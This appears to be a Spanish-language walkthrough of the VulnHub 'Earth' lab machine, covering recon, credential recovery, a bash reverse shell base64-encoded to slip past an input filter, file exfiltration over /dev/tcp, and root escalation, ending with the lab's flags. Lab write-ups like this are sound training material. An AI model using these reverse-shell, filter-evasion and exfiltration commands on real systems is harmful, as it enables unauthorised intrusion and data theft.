@@ -1,0 +1,219 @@
+I"}9<p><a href="https://www.vulnhub.com/entry/the-planets-earth,755/">https://www.vulnhub.com/entry/the-planets-earth,755/</a></p>
+
+<p>Realizar un escaneo nmap a la red para buscar el equipo</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-vvv</span> <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-O</span> <span class="nt">-Pn</span> 192.168.122.0/24
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/1.png" alt="image-center" class="align-center" /></p>
+
+<p>Saldrá una máquina con varios puertos abiertos</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/2.png" alt="image-center" class="align-center" /></p>
+
+<p>Realizar un escaneo nmap profundo a la IP que aparece</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-vvv</span> <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-O</span>  <span class="nt">-p-</span> <span class="nt">--min-rate</span> 5000 <span class="nt">--script</span> vuln <span class="nt">-Pn</span> 192.168.122.11 <span class="nt">-oG</span> allports
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/3.png" alt="image-center" class="align-center" /></p>
+
+<p>Aparecerán los puertos <code class="language-plaintext highlighter-rouge">22,80,443</code> abiertos</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/4.png" alt="image-center" class="align-center" /></p>
+
+<p>Aparecerán bastantes vulnerabilidades, entre ellas se mostrarán dos DNS que habra que poner en <code class="language-plaintext highlighter-rouge">/etc/hosts</code> apuntando a la IP de la máquina victima</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/5.png" alt="image-center" class="align-center" /></p>
+
+<p>Editar el archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> para añadir las DNS</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nano /etc/hosts
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/6.png" alt="image-center" class="align-center" /></p>
+
+<p>Entrar a la web como <code class="language-plaintext highlighter-rouge">earth.local</code></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/7.png" alt="image-center" class="align-center" /></p>
+
+<p>Realizar un escaneo nmap a ambas DNS como https</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> https://earth.local <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-k</span>
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/8.png" alt="image-center" class="align-center" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> https://terratest.earth.local <span class="nt">-w</span> /usr/share/wordlists/dirb/common.txt <span class="nt">-k</span>
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/9.png" alt="image-center" class="align-center" /></p>
+
+<p>Reportará que hay un <code class="language-plaintext highlighter-rouge">robots.txt</code>, acceder a él. Mostrará una lista de directorios.</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/10.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir a <code class="language-plaintext highlighter-rouge">/testingnotes.txt</code></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/11.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir a <code class="language-plaintext highlighter-rouge">testdata.txt</code></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/12.png" alt="image-center" class="align-center" /></p>
+
+<p>Usar cyberchef para desencriptar los mensajes de earth.local usando como clave el texto de <code class="language-plaintext highlighter-rouge">testdata.txt</code></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/13.png" alt="image-center" class="align-center" /></p>
+
+<p>Mostrará un menaje repetido bastantes veces que es earthclimatechangebad4humans
+Usar ese resultado como contraseña en <code class="language-plaintext highlighter-rouge">earth.local/admin/login</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Usuario: terra
+Contraseña: earthclimatechangebad4humans
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/14.png" alt="image-center" class="align-center" /></p>
+
+<p>Al intentar hacer un reverse shell mostrará que no están permitidas las conexiones, esto es porque detecta que se está introduciendo un comando de reverse shell</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/192.168.122.13/4444 0&gt;&amp;1
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/15.png" alt="image-center" class="align-center" /></p>
+
+<p>Encriptar el comando con base64</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"/bin/bash -i &gt;&amp; /dev/tcp/192.168.122.13/4444 0&gt;&amp;1"</span> | <span class="nb">base64</span>
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/16.png" alt="image-center" class="align-center" /></p>
+
+<p>Poner el puerto en escucha</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> 4444
+</code></pre></div></div>
+
+<p>IMPORTANTE: Utilizo <code class="language-plaintext highlighter-rouge">ncwrap</code> que es un alias que he asignado al comando “<code class="language-plaintext highlighter-rouge">rlwrap nc</code>”, para poder usar un shell inverso mejorado.</p>
+
+<p>Para poder usarlo instalar <code class="language-plaintext highlighter-rouge">rlwrap</code> con <code class="language-plaintext highlighter-rouge">sudo apt install -y rlwrap</code> y opcionalmente crear un alias que al escribirlo ejecute “<code class="language-plaintext highlighter-rouge">rlwrap nc</code>”</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/17.png" alt="image-center" class="align-center" /></p>
+
+<p>Mandar ese comando encriptado indicando que después se desencripte y ejecute</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMTIyLjEzLzQ0NDQgMD4mMQo='</span> | <span class="nb">base64</span> <span class="nt">-d</span> | bash
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/18.png" alt="image-center" class="align-center" /></p>
+
+<p>Se abrirá un shell inverso</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/19.png" alt="image-center" class="align-center" /></p>
+
+<p>Al ir a <code class="language-plaintext highlighter-rouge">/var</code> se podrá ver un directorio llamado <code class="language-plaintext highlighter-rouge">earth_web</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /var
+<span class="nb">ls</span> –la
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/20.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir a <code class="language-plaintext highlighter-rouge">earth_web</code> y mostrar el contenido</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>earth_web
+<span class="nb">ls</span> <span class="nt">-la</span>
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/21.png" alt="image-center" class="align-center" /></p>
+
+<p>Leer el archivo <code class="language-plaintext highlighter-rouge">user_flag.txt</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>user_flag.txt
+Flag: <span class="o">[</span>user_flag_3353b67d6437f07ba7d34afd7d2fc27d]
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/22.png" alt="image-center" class="align-center" /></p>
+
+<p>Buscar archivos en el sistema con permisos especiales para el usuario actual</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s 2&gt;/dev/null
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/23.png" alt="image-center" class="align-center" /></p>
+
+<p>Saldrá un archivo llamado <code class="language-plaintext highlighter-rouge">reset_root</code>, al ejecutarlo mostrará un error</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/24.png" alt="image-center" class="align-center" /></p>
+
+<p>Al intentar hacer un <code class="language-plaintext highlighter-rouge">cat</code> al archivo este será ilegible</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/25.png" alt="image-center" class="align-center" /></p>
+
+<p>Por esto será necesario mandar el archivo al equipo atacante para poder revisarlo.</p>
+
+<p>Primero se pondrá un puerto en escucha esperando por la información del archivo y que lo guardará en el equipo:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nlvp</span> 9002 <span class="o">&gt;</span> reset_root
+</code></pre></div></div>
+
+<p>Luego mandar el archivo:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /usr/bin/reset_root <span class="o">&gt;</span> /dev/tcp/192.168.122.13/9002
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/26.png" alt="image-center" class="align-center" /></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/27.png" alt="image-center" class="align-center" /></p>
+
+<p>Se recibirá correctamente y el <code class="language-plaintext highlighter-rouge">nc</code> se cerrará</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/28.png" alt="image-center" class="align-center" /></p>
+
+<p>Dar permisos de ejecución al archivo <code class="language-plaintext highlighter-rouge">reset_root</code></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/29.png" alt="image-center" class="align-center" /></p>
+
+<p>Asegurar que se tiene instalado <code class="language-plaintext highlighter-rouge">strace</code>, sino instalarlo</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt <span class="nb">install</span> –y strace
+</code></pre></div></div>
+
+<p>Comprobar el contenido del archivo <code class="language-plaintext highlighter-rouge">reset_root</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strace <span class="nt">-f</span> ./reset_root
+</code></pre></div></div>
+
+<p>Entre todo el contenido mostrará unas líneas que comprueban si existen unos archivos, de existir entonces el script cambia la contraseña del usuario root.</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/30.png" alt="image-center" class="align-center" /></p>
+
+<p>Crear los archivos en el equipo víctima</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">touch</span> /dev/shm/kHgTFI5G /dev/shm/Zw7bV9U5 /tmp/kcM0Wewe
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/31.png" alt="image-center" class="align-center" /></p>
+
+<p>Ejecutar de nuevo el archivo <code class="language-plaintext highlighter-rouge">reset_root</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/bin/reset_root
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/31.png" alt="image-center" class="align-center" /></p>
+
+<p>Ahora habrá cambiado la contraseña de <code class="language-plaintext highlighter-rouge">root</code> a <code class="language-plaintext highlighter-rouge">Earth</code></p>
+
+<p>Cambiar al usuario <code class="language-plaintext highlighter-rouge">root</code> con la contraseña <code class="language-plaintext highlighter-rouge">Earth</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>su
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/32.png" alt="image-center" class="align-center" /></p>
+
+<p>Comprobar que el usuario es root</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">whoami</span>
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/33.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir al directorio de root y mostrar el contenido</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /root
+<span class="nb">ls</span> –la
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/34.png" alt="image-center" class="align-center" /></p>
+
+<p>Leer el archivo <code class="language-plaintext highlighter-rouge">root_flag.txt</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>root_flag.txt
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/35.png" alt="image-center" class="align-center" /></p>
+
+<h2 id="flags">Flags</h2>
+
+<p>Usuario: [user_flag_3353b67d6437f07ba7d34afd7d2fc27d]</p>
+
+<p>Root: [root_flag_b0da9554d29db2117b02aa8b66ec492e]</p>
+:ET
